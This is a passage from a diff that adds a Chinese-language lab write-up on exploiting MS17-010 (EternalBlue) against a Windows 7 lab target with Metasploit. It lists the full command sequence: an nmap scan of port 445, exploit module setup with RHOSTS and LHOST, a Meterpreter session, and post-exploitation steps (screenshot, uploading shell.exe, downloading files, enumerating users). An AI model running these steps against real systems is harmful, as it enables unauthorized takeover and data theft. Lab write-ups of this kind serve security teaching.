+<h2 id="4-4-永恒之蓝漏洞攻击实验"><a href="#4-4-永恒之蓝漏洞攻击实验" class="headerlink" title="4.4 永恒之蓝漏洞攻击实验"></a>4.4 永恒之蓝漏洞攻击实验</h2><h3 id="一、实验目标-1"><a href="#一、实验目标-1" class="headerlink" title="一、实验目标"></a>一、实验目标</h3><p>利用 Metasploit 框架，针对 Windows 7 靶机的 <strong>MS17-010（永恒之蓝）</strong> 漏洞实施攻击，获取系统控制权限，验证 SMB 服务漏洞的风险。  </p>
+<h3 id="二、实验方法与步骤-1"><a href="#二、实验方法与步骤-1" class="headerlink" title="二、实验方法与步骤"></a>二、实验方法与步骤</h3><h4 id="（一）网络环境探测-1"><a href="#（一）网络环境探测-1" class="headerlink" title="（一）网络环境探测"></a>（一）网络环境探测</h4><ol>
+<li><strong>查看本地 IP 地址</strong><br>终端执行命令，获取 Kali 攻击机 IP：</li>
+</ol>
+<pre><code class="bash">   ifconfig  
+   # 示例输出：192.168.40.130（需替换为实际 IP ）
+</code></pre>
+<ol start="2">
+<li><strong>扫描靶机 445 端口</strong><br>使用 <code>nmap</code> 扫描同一网段（如 <code>192.168.40.0/24</code> ），检测 445 端口（SMB 服务）状态：</li>
+</ol>
+<pre><code class="bash">   nmap -sS -p 445 192.168.40.0/24  
+   # 若靶机 IP 显示 445/tcp open ，则存在永恒之蓝攻击面
+</code></pre>
+<h4 id="（二）漏洞利用（Metasploit-框架）"><a href="#（二）漏洞利用（Metasploit-框架）" class="headerlink" title="（二）漏洞利用（Metasploit 框架）"></a>（二）漏洞利用（Metasploit 框架）</h4><ol>
+<li><strong>启动 MSF 控制台</strong><br>终端执行命令，进入 Metasploit 交互环境：</li>
+</ol>
+<pre><code class="bash">   msfconsole  
+</code></pre>
+<ol start="2">
+<li><strong>搜索永恒之蓝模块</strong><br>在 MSF 控制台，搜索漏洞利用模块：</li>
+</ol>
+<pre><code class="bash">   search ms17_010  
+   # 选择 exploit/windows/smb/ms17_010_eternalblue 模块
+</code></pre>
+<ol start="3">
+<li><strong>配置攻击参数</strong><br>依次设置目标 IP、本地 IP（攻击机）：</li>
+</ol>
+<pre><code class="bash">   use exploit/windows/smb/ms17_010_eternalblue  
+   set RHOSTS 192.168.40.100  # 替换为实际靶机 IP（如 Win7 地址）
+   set LHOST 192.168.40.130  # 替换为攻击机 IP（Kali 地址）
+</code></pre>
+<ol start="4">
+<li><strong>执行攻击，获取 Meterpreter 会话</strong><br>启动攻击，等待返回 Meterpreter 控制会话：</li>
+</ol>
+<pre><code class="bash">   exploit  
+   # 若成功，显示 Meterpreter session opened
+</code></pre>
+<h4 id="（三）后渗透操作"><a href="#（三）后渗透操作" class="headerlink" title="（三）后渗透操作"></a>（三）后渗透操作</h4><p>获取会话后，执行以下操作验证控制权限：  </p>
+<ol>
+<li><strong>捕获靶机屏幕</strong></li>
+</ol>
+<pre><code class="bash">   screenshot  
+   # 生成屏幕截图文件（可下载查看）
+</code></pre>
+<ol start="2">
+<li><strong>上传&#x2F;下载文件</strong>  <ul>
+<li>上传文件到靶机：</li>
+</ul>
+</li>
+</ol>
+<pre><code class="bash">     upload /本地文件路径 目标路径  
+     # 示例：upload /root/shell.exe C:\Temp\ 
+</code></pre>
+<ul>
+<li>从靶机下载文件：</li>
+</ul>
+<pre><code class="bash">     download 目标文件路径 /本地保存路径  
+     # 示例：download C:\Users\flag.txt /root/ 
+</code></pre>
+<ol start="3">
+<li><strong>获取系统信息</strong></li>
+</ol>
+<pre><code class="bash">   sysinfo  
+   # 输出靶机系统版本（如 Windows 7 Professional SP1 x64 ）
+</code></pre>
+<ol start="4">
+<li><strong>枚举系统用户</strong></li>
+</ol>
+<pre><code class="bash">   run post/windows/gather/enum_users  
+   # 输出用户列表（如 Administrator、Guest ）
+</code></pre>
 <h3 id="三、实验结果分析"><a href="#三、实验结果分析" class="headerlink" title="三、实验结果分析"></a>三、实验结果分析</h3><ol>
 <li><p><strong>漏洞利用成功标志</strong>  </p>
 <ul>
